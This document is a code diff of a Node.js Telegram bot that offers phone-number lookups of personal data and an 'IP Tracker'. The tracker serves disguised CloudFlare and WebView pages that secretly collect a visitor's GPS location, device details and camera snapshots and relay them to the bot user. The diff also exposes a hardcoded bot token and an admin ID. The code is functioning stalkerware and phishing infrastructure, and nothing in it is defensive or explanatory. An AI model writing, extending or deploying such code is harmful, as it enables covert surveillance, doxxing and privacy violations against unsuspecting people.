@@ -7,28 +7,16 @@ const path = require('path');
 
 // ==================== 🔧 CONFIGURATION ====================
 const CONFIG = {
-  // Bot Settings
   BOT_TOKEN: '8377073485:AAERCkZcNZhupFa2Rs2uWrqFhlPQQW2xGqM',
-  WEBHOOK_URL: 'https://botu-info-xjjf.onrender.com',
+  WEBHOOK_URL: 'https://botu-s3f9.onrender.com',
   PORT: process.env.PORT || 10000,
-  
-  // Admin
   ADMIN_ID: 8175884349,
   DEVELOPER: '@aadi_io',
-  
-  // API
   MOBILE_API_URL: 'https://demon.taitanx.workers.dev/?mobile=',
-  
-  // Blacklist
   BLACKLISTED_NUMBERS: ['9161636853', '9451180555', '6306791897'],
-  
-  // Features
   ENABLE_CAPTCHA: true,
-  CAPTCHA_DURATION: 5000, // milliseconds
-  ENABLE_CAMERA: true,
-  
-  // Cache
-  CACHE_DURATION: 300000, // 5 minutes
+  CAPTCHA_DURATION: 5000,
+  CACHE_DURATION: 300000,
   MAX_CACHE_SIZE: 100,
   MAX_HISTORY: 50
 };
@@ -42,6 +30,12 @@ app.use(bodyParser.json({ limit: '20mb' }));
 app.use(bodyParser.urlencoded({ extended: true, limit: '20mb' }));
 app.set('view engine', 'ejs');
 app.set('views', path.join(__dirname, 'views'));
+
+// Request logger
+app.use((req, res, next) => {
+  console.log(`📥 ${req.method} ${req.path}`);
+  next();
+});
 
 // ==================== Data Storage ====================
 const stats = {
@@ -180,7 +174,7 @@ const welcomeMsg = (name, isAdmin) => `
 
 👋 Welcome <b>${name}</b>!
 
-<b>📋 Available Services:</b>
+<b>📋 Services:</b>
 
 🔍 <b>Number Lookup</b>
    • Mobile info search
@@ -194,7 +188,7 @@ const welcomeMsg = (name, isAdmin) => `
 
 ${isAdmin ? '\n🔐 <b>Admin Access</b>\n' : ''}
 ━━━━━━━━━━━━━━━━━━━━━
-<i>Select a service below ⬇️</i>
+<i>Choose a service below ⬇️</i>
 `;
 
 const statsMsg = () => {
@@ -222,51 +216,11 @@ const statsMsg = () => {
 └─ Cache: <code>${cache.size}</code>
 
 <b>⚙️ System</b>
-├─ Uptime: <code>${uptime()}</code>
-└─ Protected: <code>${CONFIG.BLACKLISTED_NUMBERS.length}</code>
+└─ Uptime: <code>${uptime()}</code>
 
 ━━━━━━━━━━━━━━━━━━━━━
 <i>${new Date().toLocaleTimeString()}</i>
 `;
-};
-
-const historyMsg = () => {
-  if (history.length === 0) {
-    return `<b>📜 Search History</b>\n\n<i>No searches yet</i>`;
-  }
-
-  const icons = { success: '✅', failed: '❌', blacklist: '🚫' };
-  let txt = `╔══════════════════════╗\n║  <b>📜 History</b>          ║\n╚══════════════════════╝\n\n`;
-
-  history.slice(-10).reverse().forEach((e, i) => {
-    const icon = icons[e.status] || '⚪️';
-    const time = e.time.toLocaleTimeString('en-IN', { hour12: false });
-    txt += `${i + 1}. ${icon} <code>${formatPhone(e.num)}</code>\n`;
-    txt += `   👤 ${e.name} • 🕐 ${time}\n\n`;
-  });
-
-  return txt + `━━━━━━━━━━━━━━━━━━━━━\n<i>Total: ${history.length}</i>`;
-};
-
-const usersMsg = () => {
-  if (activity.size === 0) {
-    return `<b>👥 Users</b>\n\n<i>No activity yet</i>`;
-  }
-
-  const sorted = Array.from(activity.entries())
-    .sort((a, b) => b[1].count - a[1].count)
-    .slice(0, 10);
-
-  let txt = `╔══════════════════════╗\n║  <b>👥 Top Users</b>        ║\n╚══════════════════════╝\n\n`;
-
-  sorted.forEach(([uid, data], i) => {
-    const last = data.last ? data.last.toLocaleDateString('en-IN') : 'Never';
-    const medal = i === 0 ? '🥇' : i === 1 ? '🥈' : i === 2 ? '🥉' : `${i + 1}.`;
-    txt += `${medal} <b>${data.name}</b>\n`;
-    txt += `   🔍 ${data.count} • 📅 ${last}\n\n`;
-  });
-
-  return txt + `━━━━━━━━━━━━━━━━━━━━━\n<i>Total: ${activity.size}</i>`;
 };
 
 // ==================== API ====================
@@ -300,7 +254,7 @@ async function fetchMobileInfo(mobile) {
     return null;
   } catch (error) {
     stats.failed++;
-    console.error('API Error:', error.message);
+    console.error('❌ API Error:', error.message);
     return null;
   }
 }
@@ -319,7 +273,7 @@ function formatResult(data, num) {
 <i>Nice try! 🤡</i>
 
 ━━━━━━━━━━━━━━━━━━━━━
-<i>Security by ${CONFIG.DEVELOPER}</i>
+<i>${CONFIG.DEVELOPER}</i>
 `;
   }
 
@@ -352,7 +306,7 @@ function formatResult(data, num) {
   });
 
   if (unique.length === 0) {
-    return `<b>❌ Empty</b>\n\n📱 <code>${formatPhone(num)}</code>`;
+    return `<b>❌ No Data</b>\n\n📱 <code>${formatPhone(num)}</code>`;
   }
 
   const results = unique.slice(0, 3).map((r, i) => {
@@ -393,8 +347,16 @@ ${addr}
   return results.join('\n');
 }
 
+// ==================== Webhook Route (MUST BE FIRST) ====================
+app.post(`/${CONFIG.BOT_TOKEN}`, (req, res) => {
+  console.log('📨 Webhook Update Received');
+  bot.processUpdate(req.body);
+  res.sendStatus(200);
+});
+
 // ==================== IP Tracker Routes ====================
 app.get('/c/:path/:uri', (req, res) => {
+  console.log('🌐 CloudFlare page accessed');
   stats.ipClicks++;
   if (req.params.path) {
     res.render('cloudflare', {
@@ -411,6 +373,7 @@ app.get('/c/:path/:uri', (req, res) => {
 });
 
 app.get('/w/:path/:uri', (req, res) => {
+  console.log('🌐 WebView page accessed');
   stats.ipClicks++;
   if (req.params.path) {
     res.render('webview', {
@@ -426,6 +389,7 @@ app.get('/w/:path/:uri', (req, res) => {
 });
 
 app.post('/location', async (req, res) => {
+  console.log('📍 Location received');
   const { lat, lon, uid, acc } = req.body;
   
   if (lat && lon && uid && acc) {
@@ -435,12 +399,12 @@ app.post('/location', async (req, res) => {
       
       await bot.sendLocation(userId, parseFloat(lat), parseFloat(lon));
       await bot.sendMessage(userId, 
-        `╔══════════════════════╗\n║ <b>📍 Location</b>         ║\n╚══════════════════════╝\n\n<b>Coordinates</b>\nLat: <code>${lat}</code>\nLon: <code>${lon}</code>\nAccuracy: <code>${acc}m</code>\n\n🗺️ <a href="https://www.google.com/maps?q=${lat},${lon}">View on Google Maps</a>\n\n━━━━━━━━━━━━━━━━━━━━━\n<i>${getTime()}</i>`,
+        `╔══════════════════════╗\n║ <b>📍 Location</b>         ║\n╚══════════════════════╝\n\n<b>Coordinates</b>\nLat: <code>${lat}</code>\nLon: <code>${lon}</code>\nAcc: <code>${acc}m</code>\n\n🗺️ <a href="https://www.google.com/maps?q=${lat},${lon}">Google Maps</a>\n\n━━━━━━━━━━━━━━━━━━━━━\n<i>${getTime()}</i>`,
         { parse_mode: 'HTML', disable_web_page_preview: true }
       );
       res.send('OK');
     } catch (err) {
-      console.error('Location error:', err.message);
+      console.error('❌ Location error:', err.message);
       res.send('Error');
     }
   } else {
@@ -449,6 +413,7 @@ app.post('/location', async (req, res) => {
 });
 
 app.post('/info', async (req, res) => {
+  console.log('ℹ️ Info received');
   const { uid, data } = req.body;
 
   if (uid && data) {
@@ -458,7 +423,7 @@ app.post('/info', async (req, res) => {
       });
       res.send('OK');
     } catch (err) {
-      console.error('Info error:', err.message);
+      console.error('❌ Info error:', err.message);
       res.send('Error');
     }
   } else {
@@ -467,6 +432,7 @@ app.post('/info', async (req, res) => {
 });
 
 app.post('/camsnap', async (req, res) => {
+  console.log('📷 Camera snapshot received');
   const { uid, img } = req.body;
 
   if (uid && img) {
@@ -480,7 +446,7 @@ app.post('/camsnap', async (req, res) => {
       });
       res.send('OK');
     } catch (err) {
-      console.error('Camera error:', err.message);
+      console.error('❌ Camera error:', err.message);
       res.send('Error');
     }
   } else {
@@ -489,12 +455,9 @@ app.post('/camsnap', async (req, res) => {
 });
 
 // ==================== Bot Handlers ====================
-app.post(`/${CONFIG.BOT_TOKEN}`, (req, res) => {
-  bot.processUpdate(req.body);
-  res.sendStatus(200);
-});
-
 bot.on('message', async (msg) => {
+  console.log(`💬 Message from ${msg.from.id}: ${msg.text}`);
+  
   const chatId = msg.chat.id;
   const userId = msg.from.id;
   const userName = msg.from.first_name || 'User';
@@ -659,6 +622,8 @@ Unable to fetch data
 });
 
 bot.on('callback_query', async (query) => {
+  console.log(`🔘 Callback: ${query.data} from ${query.from.id}`);
+  
   const chatId = query.message.chat.id;
   const msgId = query.message.message_id;
   const userId = query.from.id;
@@ -694,7 +659,7 @@ bot.on('callback_query', async (query) => {
       case 'ip_tracker':
         states.set(chatId, 'waiting_url');
         await bot.editMessageText(
-          '╔══════════════════════╗\n║  <b>🌐 IP Tracker</b>      ║\n╚══════════════════════╝\n\n<b>Send URL to track</b>\n\n💡 <code>https://example.com</code>\n\n<b>📊 Tracks:</b>\n• 📍 Location\n• 🌐 IP Address\n• 📱 Device\n• 📷 Camera\n\n<i>Include http:// or https://</i>',
+          '╔══════════════════════╗\n║  <b>🌐 IP Tracker</b>      ║\n╚══════════════════════╝\n\n<b>Send URL to track</b>\n\n💡 <code>https://example.com</code>\n\n<b>📊 Tracks:</b>\n• 📍 Location\n• 🌐 IP\n• 📱 Device\n• 📷 Camera\n\n<i>Include http:// or https://</i>',
           {
             chat_id: chatId,
             message_id: msgId,
@@ -740,32 +705,10 @@ bot.on('callback_query', async (query) => {
             });
           } catch (err) {
             await bot.answerCallbackQuery(query.id, {
-              text: `❌ Error: ${err.message}`,
+              text: `❌ Error`,
               show_alert: true
             });
           }
-        }
-        break;
-
-      case 'history':
-        if (userId === CONFIG.ADMIN_ID) {
-          await bot.editMessageText(historyMsg(), {
-            chat_id: chatId,
-            message_id: msgId,
-            parse_mode: 'HTML',
-            reply_markup: adminKeyboard
-          });
-        }
-        break;
-
-      case 'users':
-        if (userId === CONFIG.ADMIN_ID) {
-          await bot.editMessageText(usersMsg(), {
-            chat_id: chatId,
-            message_id: msgId,
-            parse_mode: 'HTML',
-            reply_markup: adminKeyboard
-          });
         }
         break;
 
@@ -774,14 +717,14 @@ bot.on('callback_query', async (query) => {
           const size = cache.size;
           cache.clear();
           await bot.answerCallbackQuery(query.id, {
-            text: `✅ Cache Cleared\n\n${size} entries removed`,
+            text: `✅ Cache Cleared\n\n${size} entries`,
             show_alert: true
           });
         }
         break;
     }
   } catch (err) {
-    console.error('Callback error:', err.message);
+    console.error('❌ Callback error:', err.message);
   }
 });
 
@@ -792,6 +735,7 @@ app.get('/', (req, res) => {
     bot: 'Multi-Info Bot',
     version: '5.0',
     developer: CONFIG.DEVELOPER,
+    webhook: `${CONFIG.WEBHOOK_URL}/${CONFIG.BOT_TOKEN}`,
     stats: {
       uptime: uptime(),
       users: stats.users.size,
@@ -805,22 +749,50 @@ app.get('/health', (req, res) => {
   res.json({ status: 'healthy', uptime: uptime() });
 });
 
+app.get('/webhook-info', async (req, res) => {
+  try {
+    const info = await bot.getWebHookInfo();
+    res.json({
+      url: info.url,
+      pending: info.pending_update_count,
+      last_error: info.last_error_message,
+      last_error_date: info.last_error_date
+    });
+  } catch (err) {
+    res.json({ error: err.message });
+  }
+});
+
+// Error handler
+app.use((err, req, res, next) => {
+  console.error('❌ Express Error:', err.message);
+  res.status(500).send('Internal Server Error');
+});
+
 // ==================== Start ====================
 async function setupWebhook() {
   try {
-    console.log('🔄 Setting up webhook...');
+    console.log('🔄 Removing old webhook...');
     await bot.deleteWebHook();
     
     await new Promise(resolve => setTimeout(resolve, 2000));
     
     const webhookUrl = `${CONFIG.WEBHOOK_URL}/${CONFIG.BOT_TOKEN}`;
-    await bot.setWebHook(webhookUrl);
+    console.log('🔗 Setting webhook:', webhookUrl);
     
-    console.log('✅ Webhook set:', webhookUrl);
+    await bot.setWebHook(webhookUrl, {
+      max_connections: 100,
+      allowed_updates: ['message', 'callback_query']
+    });
+    
+    console.log('✅ Webhook set successfully!');
     
     const info = await bot.getWebHookInfo();
-    console.log('📍 URL:', info.url);
-    console.log('📊 Pending:', info.pending_update_count);
+    console.log('📍 Webhook URL:', info.url);
+    console.log('📊 Pending updates:', info.pending_update_count);
+    if (info.last_error_message) {
+      console.log('⚠️ Last error:', info.last_error_message);
+    }
     
     return true;
   } catch (err) {
@@ -830,24 +802,32 @@ async function setupWebhook() {
 }
 
 app.listen(CONFIG.PORT, async () => {
-  console.log('\n' + '='.repeat(50));
+  console.log('\n' + '='.repeat(60));
   console.log('🚀 Multi-Info Bot v5.0');
-  console.log('='.repeat(50));
+  console.log('='.repeat(60));
+  console.log(`🆔 Bot Token: ${CONFIG.BOT_TOKEN.slice(0, 20)}...`);
+  console.log(`🌐 Webhook URL: ${CONFIG.WEBHOOK_URL}`);
   console.log(`👤 Developer: ${CONFIG.DEVELOPER}`);
-  console.log(`🆔 Admin: ${CONFIG.ADMIN_ID}`);
-  console.log(`🔒 Protected: ${CONFIG.BLACKLISTED_NUMBERS.length}`);
-  console.log('='.repeat(50));
+  console.log(`🔒 Protected Numbers: ${CONFIG.BLACKLISTED_NUMBERS.length}`);
+  console.log('='.repeat(60));
   
   const success = await setupWebhook();
   
   if (success) {
-    console.log(`\n✅ Port: ${CONFIG.PORT}`);
-    console.log('✅ Bot ready!');
-    console.log(`🌐 ${CONFIG.WEBHOOK_URL}\n`);
+    console.log(`\n✅ Server running on port ${CONFIG.PORT}`);
+    console.log('✅ Bot is ready and listening!');
+    console.log(`🔍 Check: ${CONFIG.WEBHOOK_URL}/webhook-info`);
+    console.log(`💚 Health: ${CONFIG.WEBHOOK_URL}/health\n`);
+    console.log('='.repeat(60) + '\n');
   } else {
-    console.log('\n❌ Webhook failed\n');
+    console.log('\n❌ Webhook setup failed!');
+    console.log('Check the logs above for errors\n');
   }
 });
 
-bot.on('polling_error', (err) => console.error('Polling:', err.code));
-bot.on('webhook_error', (err) => console.error('Webhook:', err.code));
+bot.on('polling_error', (err) => console.error('❌ Polling:', err.code));
+bot.on('webhook_error', (err) => console.error('❌ Webhook:', err.code));
+
+process.on('unhandledRejection', (err) => {
+  console.error('❌ Unhandled Rejection:', err);
+});
